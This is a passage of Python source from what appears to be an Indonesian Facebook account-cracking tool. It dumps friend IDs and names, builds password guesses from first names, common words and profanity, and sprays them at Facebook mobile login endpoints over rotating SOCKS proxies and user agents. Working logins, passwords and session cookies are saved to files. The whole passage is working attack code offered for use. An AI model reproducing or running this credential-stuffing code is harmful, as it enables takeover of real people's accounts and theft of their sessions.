							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if '100001' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100002' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100003' in c:
								if c in id:pass
								else:		
									if len(g)<14:pass
									else:id.append(c)
							elif '100004' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100005' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100006' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100007' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100008' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100009' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
						ngatur()
					elif 'sepuh' in umur:
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if '1000001' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000002' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000003' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000004' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000005' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000006' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000007' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000008' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000009' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
						ngatur()
					elif 'modar' in umur:
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if '1000000' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
						ngatur()
					elif 'muda' in umur:
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if '10001' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10002' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10003' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10004' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10005' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10006' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10007' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10008' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
						ngatur()
					elif 'tumbal' in umur:
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if '10008' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10009' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
						ngatur()
					else:
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if c in id:pass
							else:
								if len(g)<14:pass
								else:id.append(c)
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
						ngatur()
				else:
					if 'tua' in umur:
						print('tua')
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if '100001' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100002' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100003' in c:
								if c in id:pass
								else:		
									if len(g)<14:pass
									else:id.append(c)
							elif '100004' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100005' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100006' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100007' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100008' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100009' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
							if len(id) == limitd:ngatur()
							else:pass
#						ngatur()
					elif 'sepuh' in umur:
						print('sepuh')
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if '1000001' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000002' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000003' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000004' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000005' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000006' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000007' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000008' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000009' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
							if len(id) == limitd:ngatur()
							else:pass
#						ngatur()
					elif 'modar' in umur:
						print('modar')
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if '1000000' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
							if len(id) == limitd:ngatur()
							else:pass
#						ngatur()
					elif 'muda' in umur:
						print('muda')
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if '10001' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10002' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10003' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10004' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10005' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10006' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10007' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10008' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
							if len(id) == limitd:ngatur()
							else:pass
#						ngatur()
					elif 'tumbal' in umur:
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if '10008' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10009' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
							if len(id) == limitd:ngatur()
							else:pass
#						ngatur()
					else:
						print('acak')
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if c in id:pass
							else:
								if len(g)<14:pass
								else:id.append(c)
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
							if len(id) == limitd:ngatur()
							else:pass
#						ngatur()
			except KeyError:
				if 'publik' in pel:
					print('\nGagal Dump ID\n[ ! ]ID Harus Public')
				else:pass

def ngatur():
	print('\n')
	cetak(pnl("  [green]                                 MONGGO DIPILIH",width=90,padding=(0,1),style=f"bold cyan"))
	cetak(pnl("  [white] [ 1 ] Mbasic  [ 2 ] Free  [ 3 ] Mobile  [ 4 ] Stable  [ 5 ] Alpha  [ 6 ] Latest",width=90,padding=(0,1),title=f"Async",style=f"bold green"))
	cetak(pnl("  [white]               [ 7 ] Mbasic  [ 8 ] Free  [ 9 ] Mobile  [10 ] Latest",width=90,padding=(0,1),title=f"Validate",style=f"bold green"))
	cetak(pnl("  [white]                      [11 ] Mbasic  [12 ] Free  [13 ] Mobile",width=90,padding=(0,1),title=f"Reguler",style=f"bold green"))
	cetak(pnl("  [white]                        [14 ] X (async) [15 ] D (validate)",width=90,padding=(0,1),style=f"bold yellow"))
	cetak(pnl("  [white]                                [ 16 ] IP (regular)",width=90,padding=(0,1),style=f"bold yellow"))
	cetak(pnl("  [white]                                   [ 17 ] Graph",width=90,padding=(0,1),title='API',style=f"bold red"))
	metd=input('Metode : ')
	if metd in['1']:metode.append('metode1')
	elif metd in['2']:metode.append('metode2')
	elif metd in ['3']:metode.append('metode3')
	elif metd in ['7']:metode.append('metode4')
	elif metd in ['8']:metode.append('metode5')
	elif metd in ['9']:metode.append('metode6')
	elif metd in ['5']:metode.append('metode8')
	elif metd in ['6']:metode.append('metode9')
	elif metd in ['4']:metode.append('metode7')
	elif metd in ['12']:metode.append('metode11')
	elif metd in ['10']:metode.append('metode13')
	elif metd in ['13']:metode.append('metode12')
	elif metd in ['11']:metode.append('metode10')
	elif metd in ['14']:metode.append('metode14')
	elif metd in ['15']:metode.append('metode15')
	elif metd in ['16']:metode.append('metode16')
	elif metd in ['17']:metode.append('graph')
	elif metd in ['acak']:metode_acak()
	else:metode.append('metode1')
	sandi()
def metode_acak():
	with ThreadPool(max_workers=30) as otw:
		for tamsis in id:
			try:idinya,nama=tamsis.split('|')[0],tamsis.split('|')[1].lower()
			except IndexError:pass
			awal=nama.split(' ')[0]
			if len(nama)<5:
				if len(awal)<3:pwx=['anjing','kontol','memekk','sayang','jancok']
				else:
					if len(awal)>9:pwx=['kamu nanya''anjing','kontol','memekk','jancok']
					else:pwx=[awal+'123456',awal+'123',awal+'1234',awal+'12345','anjing','kontol','memekk','sayang']
			else:
				if len(awal)>9:pwx=['anjing','kontol','memekk','jancok','sayang']
				else:pwx=[awal+'321',awal+'123456',nama,'anjing','kontol','memekk','jancok','sayang',awal+'123',awal+'1234',awal+'12345']
			satu=otw.submit(metode1,idinya,pwx)
			dua=otw.submit(metode2,idinya,pwx)
			tiga=otw.submit(metode3,idinya,pwx)
			empat=otw.submit(metode4,idinya,pwx)
			lima=otw.submit(metode5,idinya,pwx)
			enam=otw.submit(metode6,idinya,pwx)
			tujuh=otw.submit(metode10,idinya,pwx)
			delapan=otw.submit(metode11,idinya,pwx)
			sembilan=otw.submit(metode12,idinya,pwx)
			random.choice([satu,dua,tiga,empat,lima,enam,tujuh,delapan,sembilan])
	print('\n==================================================')
	print(' [+] Crack process completed')
	print(' [+] Akun OK Tersimpan Di tamsis'+svo)
	print(' [+] Akun CP Tersimpan Di tamsis'+svc)
	print('==================================================')
	exit()				
				
def sandi():
	with ThreadPool(max_workers=30) as otw:
		for tamsis in id:
			try:idinya,nama=tamsis.split('|')[0],tamsis.split('|')[1].lower()
			except IndexError:pass
			awal=nama.split(' ')[0]
			if len(nama)<5:
				if len(awal)<3:pwx=['anjing','kontol','memekk','sayang','jancok']
				else:
					if len(awal)>9:pwx=['kamu nanya''anjing','kontol','memekk','jancok']
					else:pwx=[awal+'123456',awal+'123',awal+'1234',awal+'12345','anjing','kontol','memekk','sayang']
			else:
				if len(awal)>9:pwx=['anjing','kontol','memekk','jancok','sayang']
				else:pwx=[awal+'321',awal+'123456',nama,'anjing','kontol','memekk','jancok','sayang',awal+'123',awal+'1234',awal+'12345']
			if 'metode1' in metode:
				otw.submit(metode1,idinya,pwx)
			elif 'metode2' in metode:
				otw.submit(metode2,idinya,pwx)
			elif 'metode3' in metode:
				otw.submit(metode3,idinya,pwx)
			elif 'metode5' in metode:
				otw.submit(metode5,idinya,pwx)
			elif 'metode4' in metode:
				otw.submit(metode4,idinya,pwx)
			elif 'metode6' in metode:
				otw.submit(metode6,idinya,pwx)
			elif 'metode8' in metode:
				otw.submit(metode8,idinya,pwx)
			elif 'metode9' in metode:
				otw.submit(metode9,idinya,pwx)
			elif 'metode7' in metode:
				otw.submit(metode7,idinya,pwx)
			elif 'metode11' in metode:
				otw.submit(metode11,idinya,pwx)
			elif 'metode13' in metode:
				otw.submit(metode13,idinya,pwx)
			elif 'metode12' in metode:
				otw.submit(metode12,idinya,pwx)
			elif 'metode10' in metode:
				otw.submit(metode10,idinya,pwx)
			elif 'metode14' in metode:
				otw.submit(metode14,idinya,pwx)
			elif 'metode15' in metode:
				otw.submit(metode15,idinya,pwx)
			elif 'metode16' in metode:
				otw.submit(metode16,idinya,pwx)
			elif 'graph' in metode:
				otw.submit(graph,idinya,pwx)
			else:print('kontol')
	print('\n==================================================')
	print(' [+] Crack process completed')
	print(' [+] Akun OK Tersimpan Di tamsis'+svo)
	print(' [+] Akun CP Tersimpan Di tamsis'+svc)
	print('==================================================')
	exit()
def metode12(idi,sandi):
	global cp,ok,loop
	print(f'\r#Mobile-reguler# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis=requests.Session()
	for pw in sandi:
		try:
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			tamsis.headers.update({"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			kode = tamsis.get('https://m.facebook.com/login/?email='+idi).text
			data ={'lsd':re.search('name="lsd" value="(.*?)"', str(kode)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', str(kode)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', str(kode)).group(1),'li':re.search('name="li" value="(.*?)"', str(kode)).group(1),'email':idi,'pass':pw}
			hulu={'Host': 'm.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': 'empty','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login/?email='+idi,'accept-encoding':'gzip, deflate br','accept-language':'en-GB,en-US;q=0.9,en;q=0.8'}
			tamsis.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=data,allow_redirects=False,headers=hulu,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]\nID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsis'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsis'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def metode3(idi,sandi):
	global cp,ok,loop
	print(f'\r#Mobile-async# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis=requests.Session()
	for pw in sandi:
		try:
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			tamsis.headers.update({"Host": "m.facebook.com", "upgrade-insecure-requests": "1", "user-agent": ua, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
			kode = tamsis.get(f"https://m.facebook.com/login.php?skip_api_login=1&api_key=322935469656730&kid_directed_site=0&app_id=322935469656730&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Flogin%252Ffacebook%252Fresponse%252F%253Fstate%253DATD5nHC4edOMoAzC8J17lYNyHSaLUR2HV5zxWLj0OjpodHV6r6u1_gCAISpijfm0EFoQUtn16BBW8Ah2aCj5H-X0CqVofDKDRqent4fe7YA50B-ui6Mq7kTGmIp_j1U5triydjrynmOXjAhTHJR5SSfBL30-ua5TBgcJtlRgULcIHPOohSl0sQUgpvsMzAUZbSzoholY9NsYWIckn9Bq_3qfn4mtCqfPBIMJqzmPv7Qv0WacvuLDiJMhce4-3JjE8FE9m3H-nKlFSSDGVyhCTxUN0PCgiCIq1yyJhuKqlNx4aUb2kKZuPrMm4545MVT2e580DRuJYeeGuR8RqxrJ8XgtPViKGnd7XFO48NO6XhIivpaogF9BpRvn1FzNZMnVCSBZ0qI4aquNupeiwZ0ItZFVhSf2KqKkHInuvpCJ4PwZtbnRPR9jk3ZnFFb3M9puqmB47R1RaWz2y-icx8T0kiwGk-SEMtU9T3wWoxa2BbobbQL3GBt09IW2oQRiLHcb7LiYxFQoiiiroczxA4WwFrXsS2D0Hl_ZrpB5aLA-rgW080lvxV8iEYO61gj1xTMpqXF5zKz9VjE_qL0TQzK5bgaMJpywnt8TMFte0GU5C-nnDrtJQrMsVH6vMGHi0zqbtT51Cotl9FIfm9GE3Czegn7Hmrms0uDqxnFpQc0CuDs%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D74e8cf7e-d665-4088-9570-0eb586cc4ed4%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2Fresponse%2F%3Fstate%3DATD5nHC4edOMoAzC8J17lYNyHSaLUR2HV5zxWLj0OjpodHV6r6u1_gCAISpijfm0EFoQUtn16BBW8Ah2aCj5H-X0CqVofDKDRqent4fe7YA50B-ui6Mq7kTGmIp_j1U5triydjrynmOXjAhTHJR5SSfBL30-ua5TBgcJtlRgULcIHPOohSl0sQUgpvsMzAUZbSzoholY9NsYWIckn9Bq_3qfn4mtCqfPBIMJqzmPv7Qv0WacvuLDiJMhce4-3JjE8FE9m3H-nKlFSSDGVyhCTxUN0PCgiCIq1yyJhuKqlNx4aUb2kKZuPrMm4545MVT2e580DRuJYeeGuR8RqxrJ8XgtPViKGnd7XFO48NO6XhIivpaogF9BpRvn1FzNZMnVCSBZ0qI4aquNupeiwZ0ItZFVhSf2KqKkHInuvpCJ4PwZtbnRPR9jk3ZnFFb3M9puqmB47R1RaWz2y-icx8T0kiwGk-SEMtU9T3wWoxa2BbobbQL3GBt09IW2oQRiLHcb7LiYxFQoiiiroczxA4WwFrXsS2D0Hl_ZrpB5aLA-rgW080lvxV8iEYO61gj1xTMpqXF5zKz9VjE_qL0TQzK5bgaMJpywnt8TMFte0GU5C-nnDrtJQrMsVH6vMGHi0zqbtT51Cotl9FIfm9GE3Czegn7Hmrms0uDqxnFpQc0CuDs%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
			data = {'lsd': re.search('name="lsd" value="(.*?)"',str(kode)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(kode)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(kode)).group(1), 'li': re.search('name="li" value="(.*?)"',str(kode)).group(1), 'email': idi, 'pass': pw,'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(kode)).group(1)}
			hulu = {"Host": "m.facebook.com", "content-length": "10", "x-fb-lsd": '<re.Match object; span=(10302, 10332), match=''name="lsd" value="AVo4FeaGu1Y"''>', "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": "https://m.facebook.com", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://m.facebook.com/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr", "accept-encoding": "gzip, deflate", "accept-language": "en-US;q=0.8,en;q=0.7"}
			tamsis.post("https://m.facebook.com/login/device-based/login/async/?api_key=1217981644879628&auth_token=b4c978c6cc29df1e66058283d8bcbabe&skip_api_login=1&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100",data=data,allow_redirects=False,headers=hulu,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]\nID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsis'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsis'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def metode14(idi,sandi):
	global cp,ok,loop
	print(f'\r#X-async# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis=requests.Session()
	for pw in sandi:
		try:
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			tamsis.headers.update({"Host": "x.facebook.com", "upgrade-insecure-requests": "1", "user-agent": ua, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
			kode = tamsis.get(f"https://x.facebook.com/login.php?skip_api_login=1&api_key=322935469656730&kid_directed_site=0&app_id=322935469656730&signed_next=1&next=https%3A%2F%2Fx.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Flogin%252Ffacebook%252Fresponse%252F%253Fstate%253DATD5nHC4edOMoAzC8J17lYNyHSaLUR2HV5zxWLj0OjpodHV6r6u1_gCAISpijfm0EFoQUtn16BBW8Ah2aCj5H-X0CqVofDKDRqent4fe7YA50B-ui6Mq7kTGmIp_j1U5triydjrynmOXjAhTHJR5SSfBL30-ua5TBgcJtlRgULcIHPOohSl0sQUgpvsMzAUZbSzoholY9NsYWIckn9Bq_3qfn4mtCqfPBIMJqzmPv7Qv0WacvuLDiJMhce4-3JjE8FE9m3H-nKlFSSDGVyhCTxUN0PCgiCIq1yyJhuKqlNx4aUb2kKZuPrMm4545MVT2e580DRuJYeeGuR8RqxrJ8XgtPViKGnd7XFO48NO6XhIivpaogF9BpRvn1FzNZMnVCSBZ0qI4aquNupeiwZ0ItZFVhSf2KqKkHInuvpCJ4PwZtbnRPR9jk3ZnFFb3M9puqmB47R1RaWz2y-icx8T0kiwGk-SEMtU9T3wWoxa2BbobbQL3GBt09IW2oQRiLHcb7LiYxFQoiiiroczxA4WwFrXsS2D0Hl_ZrpB5aLA-rgW080lvxV8iEYO61gj1xTMpqXF5zKz9VjE_qL0TQzK5bgaMJpywnt8TMFte0GU5C-nnDrtJQrMsVH6vMGHi0zqbtT51Cotl9FIfm9GE3Czegn7Hmrms0uDqxnFpQc0CuDs%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D74e8cf7e-d665-4088-9570-0eb586cc4ed4%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2Fresponse%2F%3Fstate%3DATD5nHC4edOMoAzC8J17lYNyHSaLUR2HV5zxWLj0OjpodHV6r6u1_gCAISpijfm0EFoQUtn16BBW8Ah2aCj5H-X0CqVofDKDRqent4fe7YA50B-ui6Mq7kTGmIp_j1U5triydjrynmOXjAhTHJR5SSfBL30-ua5TBgcJtlRgULcIHPOohSl0sQUgpvsMzAUZbSzoholY9NsYWIckn9Bq_3qfn4mtCqfPBIMJqzmPv7Qv0WacvuLDiJMhce4-3JjE8FE9m3H-nKlFSSDGVyhCTxUN0PCgiCIq1yyJhuKqlNx4aUb2kKZuPrMm4545MVT2e580DRuJYeeGuR8RqxrJ8XgtPViKGnd7XFO48NO6XhIivpaogF9BpRvn1FzNZMnVCSBZ0qI4aquNupeiwZ0ItZFVhSf2KqKkHInuvpCJ4PwZtbnRPR9jk3ZnFFb3M9puqmB47R1RaWz2y-icx8T0kiwGk-SEMtU9T3wWoxa2BbobbQL3GBt09IW2oQRiLHcb7LiYxFQoiiiroczxA4WwFrXsS2D0Hl_ZrpB5aLA-rgW080lvxV8iEYO61gj1xTMpqXF5zKz9VjE_qL0TQzK5bgaMJpywnt8TMFte0GU5C-nnDrtJQrMsVH6vMGHi0zqbtT51Cotl9FIfm9GE3Czegn7Hmrms0uDqxnFpQc0CuDs%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
			data = {'lsd': re.search('name="lsd" value="(.*?)"',str(kode)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(kode)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(kode)).group(1), 'li': re.search('name="li" value="(.*?)"',str(kode)).group(1), 'email': idi, 'pass': pw,'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(kode)).group(1)}
